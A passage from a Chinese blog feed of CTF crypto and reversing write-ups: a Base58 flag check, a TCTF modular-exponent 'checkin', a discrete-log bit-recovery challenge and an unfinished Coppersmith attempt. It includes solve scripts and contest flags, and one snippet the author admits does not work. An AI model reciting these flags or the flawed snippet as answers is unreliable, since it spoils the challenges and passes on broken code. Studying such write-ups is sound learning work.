&lt;&lt; 8) + v3[v1];      v5 = v20 / 58;      *v4 = v20 % 58;      if ( v5 )      &#123;        do        &#123;          v6 = (char)*--v4;          v7 = (v6 &lt;&lt; 8) + v5;          v20 = v7 / 58;          *v4 = v7 % 58;          v5 = v20;        &#125;        while ( v20 );        v4 = v18;      &#125;      if ( ++v1 &gt;= strlen(v19) )        break;      v3 = v19;    &#125;    v2 = v22;  &#125;  v8 = 0;  if ( !*v2 )  &#123;    do      ++v8;    while ( !v2[v8] );  &#125;  v9 = v21;  if ( v8 &lt;= v21 )  &#123;    v10 = v2 - (_BYTE *)v24;    do    &#123;      v11 = (char *)v24 + v8++;      *v11 = v23[(char)v11[v10]];    &#125;    while ( v8 &lt;= v9 );  &#125;  if ( !MEMORY[0x7C1A](v24, &quot;56fkoP8KhwCf3v7CEz&quot;) )  &#123;    if ( v19 )      v12 = strlen(v19);    else      v12 = -1;    v22 = (_BYTE *)MEMORY[0x7CCC](v19, v12);    LOBYTE(v26) = 2;    v21 = MEMORY[0x7CCC](&quot;flag&quot;, 4);    LOBYTE(v26) = 3;    MEMORY[0x6124](this, &amp;v21, &amp;v22, 1024, 0);    MEMORY[0x7C66](&amp;v21);    MEMORY[0x7C66](&amp;v22);  &#125;  MEMORY[0x7C30](v17);  return MEMORY[0x7C66]();&#125;</span></span><br></pre></td></tr></table></figure>

<p>很快便可以抓住要点</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704135338529.png" alt="image-20210704135338529"></p>
<p>看我之前写的博客，这妥妥的是Base58编码</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704135404671.png" alt="image-20210704135404671"></p>
<p>也没有怎么分析源码啦，就是看到这里还有一个判断</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704135638645.png" alt="image-20210704135638645"></p>
<p>然后我直接将这串进行Base58解密，然后套上flag提交，通过了，放入运行中的程序里检测也能通过</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704135754833.png" alt="image-20210704135754833"></p>
<p>害，看别人达不溜屁做的，过把瘾过把瘾</p>
<h1 id="其他战队的WP"><a href="#其他战队的WP" class="headerlink" title="其他战队的WP"></a>其他战队的WP</h1><p>找到的别的战队师傅的WP，收集一下</p>
<p><a href="https://www.cnblogs.com/x0rjchen/p/14940396.html#_caption5">https://www.cnblogs.com/x0rjchen/p/14940396.html#_caption5</a></p>
<p><a href="https://mp.weixin.qq.com/s/AHvCrFd2E6JciItLcKlHnA">https://mp.weixin.qq.com/s/AHvCrFd2E6JciItLcKlHnA</a></p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>MT19937</tag>
      </tags>
  </entry>
  <entry>
    <title>20210704 TCTFCrypto方向部分WP</title>
    <url>/posts/df43d8e4/</url>
    <content><![CDATA[<p>0ops战队举办的比赛，题目也是很有水准的，看解出来的人数就知道</p>
<p>就出了一题，唔</p>
<p>见证sage的奇妙</p>
<span id="more"></span>

<h1 id="TCTF"><a href="#TCTF" class="headerlink" title="TCTF"></a>TCTF</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>在尚师傅手把手的悉心指导下，我艰难地完成了签到，不得不说尚师傅yyds</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704145347960.png" alt="image-20210704145347960"></p>
<p>看题目提示，只有一个nc链接和提示；没有附件，我们直接连上试试</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704145514705.png" alt="image-20210704145514705"></p>
<p>返回一个代数式，要我们给出结果，稍微想一下就知道括号里2的10842207次方结果太大，虽然确实可以算出来，但是倒数第二行也说了，要在10秒之内算出来，而且超时真的会发生；硬算是万万不行的</p>
<p>先搞一组数据下来</p>
<blockquote>
<p> 2^(2^11611932) mod 10042342927731289936658394995741010342152682534073824765054222876398250110801680355777521786191146694288599302671845390876211753297708706179377223481420568337199329681700808036260275208806645397912634380102847398612053278616443604561505446777411509098232951708762153696144378866698087620743454024477909423603 = ?</p>
</blockquote>
<p>结合提示，我尝试将指数给变小，所以思路应该集中在怎么求出这个模数的欧拉函数这个问题上。对模数进行分析，发现是1023位的，用手头现有的工具都不能将其有效分解，也就是降低指数这条路多半是行不通；而且就算是求出了欧拉函数，这个数也是很大的，放到幂上去也不能将指数变小。</p>
<p>先写个脚本接收下数据，展示下国赛之后写脚本的能力</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># nc 111.186.59.11 16256</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getroot</span>(<span class="params">s</span>):</span></span><br><span class="line">    m = re.findall(<span class="string">&quot;\d+&quot;</span>, s)</span><br><span class="line">    x, n = <span class="built_in">int</span>(m[<span class="number">2</span>]), <span class="built_in">int</span>(m[<span class="number">3</span>])</span><br><span class="line">    x = <span class="number">2</span>**x</span><br><span class="line">    ans = <span class="built_in">pow</span>(<span class="number">2</span>, x, n)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;111.186.59.11&#x27;</span>, <span class="number">16256</span>)</span><br><span class="line">    sh.recvline()</span><br><span class="line">    s = sh.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your answer: &#x27;</span>)</span><br><span class="line">    sh.sendline(getroot(s.decode()))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>其中用到了正则表达式，从网上现学现卖来的，然后这里先暂时直接将计算的结果返回了，没有经过数学上的简化</p>
<p>之后的我查了一些资料，也问了老师，但都失败告终，其中尝试过用自己写的数域筛法分解模数，但想必这种算法，yafu和在线网站应该都包含了，搭建了分解光滑数的工具也还是不行</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704160916416.png" alt="image-20210704160916416"></p>
<p>不买关子了，最后尚师傅坐我边上轻蔑地笑了我一句，说放到sage里试试；为了sage用pwn库，我还在linux子系统里装了sgae。然后代码粘贴进去也遇到点问题，主要是缩进的问题吧，写在函数会里方便一点</p>
<p>看效果</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704161339872.png" alt="image-20210704161339872"></p>
<p>amazing！竟然出来了，原来对于一般语言计算较慢的大指数，sage可以很快出来；其实细想也是，别的语言并不是慢，而是并不支持存放如此庞大的数，而如果只是一个循环来计算八位数的幂的话，时间复杂度还是允许的。所以总之，<strong>sage暂时滴神，尚师傅永远滴神。</strong></p>
<p>在win下的sage里，验证一下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704161735313.png" alt="image-20210704161735313"></p>
<p>看来还有上限的。回过来看看flag里面似乎给了一些信息</p>
<blockquote>
<p>flag{h0w_m4ny_squar3s_can_u_d0_in_10_sec0nds?}</p>
</blockquote>
<p>十秒之内能开几次方？嗯？题目似乎还有别的转机。。</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>sage</tag>
      </tags>
  </entry>
  <entry>
    <title>20210706【胖哈勃的七月公开赛】</title>
    <url>/posts/798f5cbc/</url>
    <content><![CDATA[<p>尚师傅推荐的题目，着实没有想到被他反将了一军</p>
<span id="more"></span>

<h1 id="【胖哈勃的七月公开赛】密码要先学好数学"><a href="#【胖哈勃的七月公开赛】密码要先学好数学" class="headerlink" title="【胖哈勃的七月公开赛】密码要先学好数学"></a>【胖哈勃的七月公开赛】密码要先学好数学</h1><p>那完了</p>
<h2 id="MathCrypto"><a href="#MathCrypto" class="headerlink" title="MathCrypto"></a>MathCrypto</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">a = <span class="number">288260533169915</span></span><br><span class="line">p = <span class="number">1007621497415251</span></span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&#x27;flag&#123;********************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_flag</span>(<span class="params">flag</span>):</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag])</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> plaintext:</span><br><span class="line">        e = randint(<span class="number">1</span>, p)</span><br><span class="line">        n = <span class="built_in">pow</span>(a, e, p)</span><br><span class="line">        <span class="keyword">if</span> b == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            ciphertext.append(n)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n = -n % p</span><br><span class="line">            ciphertext.append(n)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypt_flag(FLAG))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>核心的算法就是<br>$$<br>n_i=a^{e_i}mod\ p<br>$$<br>已知p是素数，e是p的完全剩余系中的某一个元素，也就是[1, p]中的一个随机数，通过n来求这一位是1还是0</p>
<p><em>可恶都是做MT的缘故，现在一看到这种随机数总想着看文件的修改时间，但一般没有明示考伪随机的题目还是不要异想天开了</em></p>
<p>我所想到的思路有，一是费马小定理，因为p是素数所以满足<br>$$<br>a^{p-1}\equiv 1\ mod\ p<br>$$<br>不过也不知道怎么继续了；二是中国剩余定理，够构造一些列的同余式<br>$$<br>\begin{cases}<br>a\equiv n_1^{d_1}\ mod\ p\\<br>a\equiv n_2^{d_2}\ mod\ p\\<br>\quad \vdots\\<br>a\equiv n_i^{d_i}\ mod\ p<br>\end{cases}<br>$$<br>但苦于d没有办法爆破得到。显然这题考的不是这两者</p>
<blockquote>
<p>解题脚本</p>
</blockquote>
<p>不得不说尚师傅的思路还是很犀利的，一看到discrete_log我就暗叫不妙，思绪瞬间涌上心头</p>
<p>暑假开始集训的第一天，我佯装给他们一道题，是来自【2020网鼎杯 青龙组 You raise me up】改编，当时只是觉得discrete_log可以如yafu一样解出离散对数，很神奇。但是背后的原理没有深究，只知道n是$2^{512}$，在这个群上求离散对数不是困难的</p>
<p>而这道题p是素数，按道理应该是困难的呢，但是我们有SageMath</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706094104620.png" alt="image-20210706094104620" style="zoom:67%;" />

<p>遇事不决</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706100646660.png" alt="image-20210706100646660" style="zoom:50%;" />

<p>简单试验了几个</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706105137154.png" alt="image-20210706105137154" style="zoom:67%;" />

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706105205534.png" alt="image-20210706105205534"></p>
<p>如果找不到离散对数就会报错，可以用异常处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为了使用Python2的print不换行</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">a = <span class="number">288260533169915</span></span><br><span class="line">p = <span class="number">1007621497415251</span></span><br><span class="line">n = [<span class="number">835573322319412</span>, <span class="number">194156231145433</span>, <span class="number">459240835091427</span>, <span class="number">254691265527581</span>, <span class="number">452163501868176</span>, <span class="number">362769806018159</span>, <span class="number">390335330574588</span>, <span class="number">795683531947695</span>, <span class="number">547245847322642</span>, <span class="number">662157248109028</span>, <span class="number">973966064208336</span>, <span class="number">252129990307548</span>, <span class="number">578699863722488</span>, <span class="number">486222427902568</span>, <span class="number">117477413047771</span>, <span class="number">740421014593358</span>, <span class="number">863241886290392</span>, <span class="number">222275563655891</span>, <span class="number">293327716717603</span>, <span class="number">708319736688481</span>, <span class="number">889074509131674</span>, <span class="number">417808854196549</span>, <span class="number">131645986814206</span>, <span class="number">249411728529916</span>, <span class="number">500308738571101</span>, <span class="number">178419560186091</span>, <span class="number">441524245815824</span>, <span class="number">270385977926445</span>, <span class="number">134464725515031</span>, <span class="number">34977330760372</span>, <span class="number">789037598270288</span>, <span class="number">871556001954572</span>, <span class="number">42895524249924</span>, <span class="number">602041422192220</span>, <span class="number">45250560584859</span>, <span class="number">836594396205340</span>, <span class="number">154261010116600</span>, <span class="number">906631913900110</span>, <span class="number">73716306230031</span>, <span class="number">57491432561272</span>, <span class="number">937546091143710</span>, <span class="number">573584711515529</span>, <span class="number">117838942375694</span>, <span class="number">108224759885936</span>, <span class="number">686520256664437</span>, <span class="number">328396509053949</span>, <span class="number">964793767786949</span>, <span class="number">952055129356587</span>, <span class="number">570054348386776</span>, <span class="number">132721379375751</span>, <span class="number">421580578207025</span>, <span class="number">302791761439275</span>, <span class="number">558510385173476</span>, <span class="number">7941240282405</span>, <span class="number">10928401173457</span>, <span class="number">382447756114972</span>, <span class="number">169542347967514</span>, <span class="number">977453208629407</span>, <span class="number">460734109220968</span>, <span class="number">573505124794720</span>, <span class="number">318306022981107</span>, <span class="number">120648106475963</span>, <span class="number">807138639422627</span>, <span class="number">996507910024607</span>, <span class="number">102816788391640</span>, <span class="number">660745079166409</span>, <span class="number">809890775939749</span>, <span class="number">832519292688500</span>, <span class="number">87538065186141</span>, <span class="number">637100151940331</span>, <span class="number">382113003094066</span>, <span class="number">470655145986067</span>, <span class="number">644778242358267</span>, <span class="number">517586163010705</span>, <span class="number">558938708706131</span>, <span class="number">150978345005135</span>, <span class="number">102930326517355</span>, <span class="number">782154305431595</span>, <span class="number">6219189599369</span>, <span class="number">243324433725873</span>, <span class="number">650527665111501</span>, <span class="number">100280527101388</span>, <span class="number">1005535261333789</span>, <span class="number">987714102930385</span>, <span class="number">1002475950204796</span>, <span class="number">922079478085088</span>, <span class="number">906834270364060</span>, <span class="number">53211341275436</span>, <span class="number">965041750990423</span>, <span class="number">77115141669784</span>, <span class="number">588069693290238</span>, <span class="number">794822251044102</span>, <span class="number">930830807276545</span>, <span class="number">201161070608812</span>, <span class="number">568151623857765</span>, <span class="number">678968180937073</span>, <span class="number">412380912864953</span>, <span class="number">162493098979490</span>, <span class="number">631342883381540</span>, <span class="number">261680062360627</span>, <span class="number">227532833267531</span>, <span class="number">251016357185685</span>, <span class="number">827419020607751</span>, <span class="number">858376422971452</span>, <span class="number">362277983384639</span>, <span class="number">527363637534876</span>, <span class="number">334777651780889</span>, <span class="number">210527722411428</span>, <span class="number">808789791291861</span>, <span class="number">520556222865899</span>, <span class="number">704810558642854</span>, <span class="number">568037991932850</span>, <span class="number">169208358508287</span>, <span class="number">413145308937205</span>, <span class="number">599769322994671</span>, <span class="number">441328336467023</span>, <span class="number">849181035363926</span>, <span class="number">83477340978714</span>, <span class="number">80594200850041</span>, <span class="number">660277475107773</span>, <span class="number">928502236651086</span>, <span class="number">790965510818429</span>, <span class="number">135278692982626</span>, <span class="number">424887158380721</span>, <span class="number">411620739036446</span>, <span class="number">135280586082276</span>, <span class="number">714308921541654</span>, <span class="number">9109479300877</span>, <span class="number">650573139284244</span>, <span class="number">870861989942716</span>, <span class="number">443255252246208</span>, <span class="number">70455275832571</span>, <span class="number">369440682873276</span>, <span class="number">515899628421991</span>, <span class="number">612793429865648</span>, <span class="number">723589985084253</span>, <span class="number">160660351599873</span>, <span class="number">846726628855115</span>, <span class="number">8027417644170</span>, <span class="number">922790558110918</span>, <span class="number">329372648478795</span>, <span class="number">363470140166698</span>, <span class="number">86704784885484</span>, <span class="number">854835234890991</span>, <span class="number">976023205217544</span>, <span class="number">652708649867132</span>, <span class="number">388967328647036</span>, <span class="number">559512066466403</span>, <span class="number">36971809912721</span>, <span class="number">335187129410393</span>, <span class="number">6855900757516</span>, <span class="number">543488958018354</span>, <span class="number">287382478990521</span>, <span class="number">439225225775323</span>, <span class="number">661397580381098</span>, <span class="number">773933897777421</span>, <span class="number">523567536261705</span>, <span class="number">390598723653906</span>, <span class="number">417048954790947</span>, <span class="number">637431635583415</span>, <span class="number">335090251298424</span>, <span class="number">206308145752203</span>, <span class="number">501544720775707</span>, <span class="number">614789886972475</span>, <span class="number">357742401606467</span>, <span class="number">289036983452171</span>, <span class="number">668519107118940</span>, <span class="number">92139870679256</span>, <span class="number">388797793877078</span>, <span class="number">372191799798178</span>, <span class="number">1004628632761505</span>, <span class="number">145521166059580</span>, <span class="number">576232295004932</span>, <span class="number">119635574132509</span>, <span class="number">216801862623375</span>, <span class="number">155870719957478</span>, <span class="number">28321309890983</span>, <span class="number">732905921144578</span>, <span class="number">791832670754979</span>, <span class="number">671433181708904</span>, <span class="number">435663032194545</span>, <span class="number">316031621753570</span>, <span class="number">220369837362135</span>, <span class="number">356539134058642</span>, <span class="number">360074630241799</span>, <span class="number">764194424366054</span>, <span class="number">46729635512483</span>, <span class="number">924976743846057</span>, <span class="number">646158916629764</span>, <span class="number">894838984085320</span>, <span class="number">757222585897598</span>, <span class="number">829482878889900</span>, <span class="number">838347423444759</span>, <span class="number">590218802707709</span>, <span class="number">793621010210316</span>, <span class="number">79947449693367</span>, <span class="number">739723478650329</span>, <span class="number">163281924014926</span>, <span class="number">808389762984067</span>, <span class="number">208262587169431</span>, <span class="number">582578916561821</span>, <span class="number">478856137518673</span>, <span class="number">650032839378814</span>, <span class="number">58022200409911</span>, <span class="number">17291737478946</span>, <span class="number">919921371618469</span>, <span class="number">473933973533026</span>, <span class="number">861870666818810</span>]</span><br><span class="line">a = mod(a, p)</span><br><span class="line">ni = [mod(_, p) <span class="keyword">for</span> _ <span class="keyword">in</span> n]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> ni:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        e = discrete_log(t, a)</span><br><span class="line">        flag += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        flag += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag = &#x27;0110011001101100011000010110011101111011010100000110000101110100011101000011001101110010011011100111001101011111001100010110111001011111011100100110010100110101011010010110010001110101001100110111001101111101&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(flag[i:i+<span class="number">8</span>], <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>跑的过程确实很慢，最后得到flag</p>
<blockquote>
<p>flag{Patt3rns_1n_re5idu3s}</p>
</blockquote>
<p>模式在剩余？</p>
<p>然后还有一点想不通的，如果discrete_log可以解出e，那按道理也可以解出d，但是虽然可以解出来，但是得到的答案并不对，不知道为什么</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706115202341.png" alt="image-20210706115202341"></p>
<p><strong>最后至于为什么能够解出来，反正暴力破解是出不来的，应该有一些求解离散对数的常用方法，在这研究也没什么必要，请继续吧</strong></p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>sage</tag>
      </tags>
  </entry>
  <entry>
    <title>20210710 CTFSHOW CJBCrypto方向部分WP</title>
    <url>/posts/78d3fdb3/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="CJB"><a href="#CJB" class="headerlink" title="CJB"></a>CJB</h1><h2 id="Cop-Run"><a href="#Cop-Run" class="headerlink" title="Cop! Run!!"></a>Cop! Run!!</h2><p>la佬出的题目，这几天la佬的题可不是白刷的</p>
<blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">n = <span class="number">1</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">p = getPrime(n)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line">P.&lt;t&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = t * t + randrange(p)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">x = [randrange(p)]</span><br><span class="line">x += [f(x[<span class="number">0</span>])]</span><br><span class="line"><span class="built_in">print</span>([x_ &gt;&gt; (n - ceil(<span class="number">5</span> * n / <span class="number">7</span>)) <span class="keyword">for</span> x_ <span class="keyword">in</span> x])</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">y = f(x[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    y = f(y)</span><br><span class="line">    flag ^^= <span class="built_in">int</span>(y)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">92946459607669937513774102250057295249718593723232674702212854287358873135783</span></span><br><span class="line"><span class="string">t^2 + 43844336985235863734419631630425915388298791521868754583032904718644333115590</span></span><br><span class="line"><span class="string">[3248642833056635029095920782095626337949113592116495266, 4883935221919623989344404485025479346028101682781790392]</span></span><br><span class="line"><span class="string">193207529097125793778662519051231322609402866155819915933598367395102313904490702547833</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Brad Pitt &amp; Angelina Jolie love each other hard in some movie.</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目中出现Cop，猜测是CopperSmith；从hint中获悉，一部零五年的电影《Mr Smith &amp; Mrs Smith》，是CopperSmith没跑了</p>
<p>先看代码，代码很简短，显然只要求出 x 的前两项，所有的问题就迎刃而解，或者说，只要知道 x[1] ，就可以求出 y ，然后依据异或的性质，加密即解密</p>
<p>而我们已知的是 x 右移73位的数据，显然是要求低位。自然而然可以想到方程的思想，设置几个变量，然后根据等式解方程。因为前面接触过 CopperSmith 在 RSA 中的应用，sage 里的 smal_roots 就是基于 CopperSmith 实现的</p>
<p>下面简单介绍一下 CopperSmith ，摘自CTF Wiki的介绍</p>
<hr>
<h2 id="CopperSmith基本原理-¶"><a href="#CopperSmith基本原理-¶" class="headerlink" title="CopperSmith基本原理 ¶"></a>CopperSmith基本原理 <a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_1">¶</a></h2><p>Coppersmith 相关攻击与 <a href="https://en.wikipedia.org/wiki/Don_Coppersmith">Don Coppersmith</a> 紧密相关，他提出了一种针对于模多项式（单变量，二元变量，甚至多元变量）找所有小整数根的多项式时间的方法。</p>
<p>这里我们以单变量为主进行介绍，假设</p>
<ul>
<li>模数为 N ，N 具有一个因子$b≥N^β,0&lt;β≤1$</li>
<li>多项式 F 的次数为$δ$</li>
</ul>
<p>那么该方法可以在$O(cδ^5log^9(N))$的复杂度内找到该多项式所有的根$x_0$，这里我们要求 $|x_0|&lt;cN^\frac{β^2}{δ}$。</p>
<p>在这个问题中，我们的目标是找到在模 N 意义下多项式所有的根，这一问题被认为是复杂的。<strong>Coppersmith method</strong> 主要是通过 <a href="https://en.wikipedia.org/wiki/Lenstra%E2%80%93Lenstra%E2%80%93Lov%C3%A1sz_lattice_basis_reduction_algorithm">Lenstra–Lenstra–Lovász lattice basis reduction algorithm</a>（LLL）方法找到</p>
<ul>
<li>与该多项式具有相同根 $x_0$</li>
<li>更小系数</li>
<li>定义域为整数域</li>
</ul>
<p>的多项式 g，由于在整数域上找多项式的根是简单的（Berlekamp–Zassenhaus），从而我们就得到了原多项式在模意义下的整数根。</p>
<p>那么问题的关键就是如何将 f 转换到 g 呢？Howgrave-Graham 给出了一种思路</p>
<img data-src="https://ctf-wiki.org/crypto/asymmetric/rsa/figure/coppersmith-howgrave-graham.png" alt="image-20180717210921382"  />

<p>也就是说我们需要找到一个具有 “更小系数” 的多项式 g，也就是下面的转换方式</p>
<img data-src="https://ctf-wiki.org/crypto/asymmetric/rsa/figure/coppersmith-f2g.png" alt="image-20180717211351350">

<p>在 LLL 算法中，有两点是非常有用的</p>
<ul>
<li>只对原来的基向量进行整数线性变换，这可以使得我们在得到 g 时，仍然以原来的 $x_0$ 为根。</li>
<li>生成的新的基向量的模长是有界的，这可以使得我们利用 Howgrave-Graham 定理。</li>
</ul>
<p>在这样的基础之上，我们再构造出多项式族 g 就可以了。</p>
<p>关于更加细节的内容，请自行搜索。同时这部分内容也会不断更新。</p>
<p>需要注意的是，由于 Coppersmith 根的约束，在 RSA 中的应用时，往往只适用于 e 较小的情况。</p>
<hr>
<p>总结，CopperSmith 可以用来一元甚至多元的多项式</p>
<p>回到题目，初步尝试，在尚师傅的指导下，我写出来了第一个多项式，设 $x_{0}$ 的低73位为 k<br>$$<br>f(x_{0}&lt;&lt;73+k)&gt;&gt;73=x_{1}<br>$$<br>是关于 k 的一元多项式，然后我们尝试能不能解</p>
<p>la佬的博客上有解一元和多元的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="comment">#单元</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (a + x)^e - c</span><br><span class="line">root = f.small_roots(X=<span class="number">2</span>^<span class="number">256</span>, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^256 with factor = n</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#多元</span></span><br><span class="line">load(<span class="string">&#x27;coppersmith.sage&#x27;</span>)</span><br><span class="line">P.&lt;x, y&gt; = PolynomialRing(GF(p))</span><br><span class="line">f = <span class="number">2</span>^<span class="number">170</span> * a^<span class="number">2</span> + <span class="number">2</span>^<span class="number">86</span> * a * x + x^<span class="number">2</span> - <span class="number">2</span>^<span class="number">85</span> * b + c - y</span><br><span class="line">roots = coron(f, X=<span class="number">2</span>^<span class="number">85</span>, Y=<span class="number">2</span>^<span class="number">85</span>, k=<span class="number">1</span>, debug=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">x, y = roots</span><br></pre></td></tr></table></figure>

<p>改了一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">92946459607669937513774102250057295249718593723232674702212854287358873135783</span></span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">pi = <span class="number">43844336985235863734419631630425915388298791521868754583032904718644333115590</span></span><br><span class="line">x_ = [<span class="number">3248642833056635029095920782095626337949113592116495266</span>, <span class="number">4883935221919623989344404485025479346028101682781790392</span>]</span><br><span class="line"></span><br><span class="line">P.&lt;t&gt; = PolynomialRing(Fp)</span><br><span class="line">f = t * t + pi</span><br><span class="line"></span><br><span class="line">PR.&lt;k&gt; = PolynomialRing(Fp)</span><br><span class="line">s = f(x_[<span class="number">0</span>]*<span class="number">2</span>^<span class="number">73</span> + k)//<span class="number">2</span>*<span class="number">73</span>-x_[<span class="number">1</span>]</span><br><span class="line">root = s.small_roots(X=<span class="number">2</span>^<span class="number">73</span>, beta=<span class="number">1</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>emmmmm 有几个问题，首先这样向右位移不知道中不中，然后总是报越界的错</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711134025217.png" alt="image-20210711134025217"></p>
<p>在尝试以及一些等效替代无果后，我想到再添加一个变量；一是因为这样表示更加清晰，省去了向右位移的不确定性，二是la佬的博客里，也有求解多元多项式的脚本</p>
<p><em>解决不了就加一层，这是我从计网学来的</em></p>
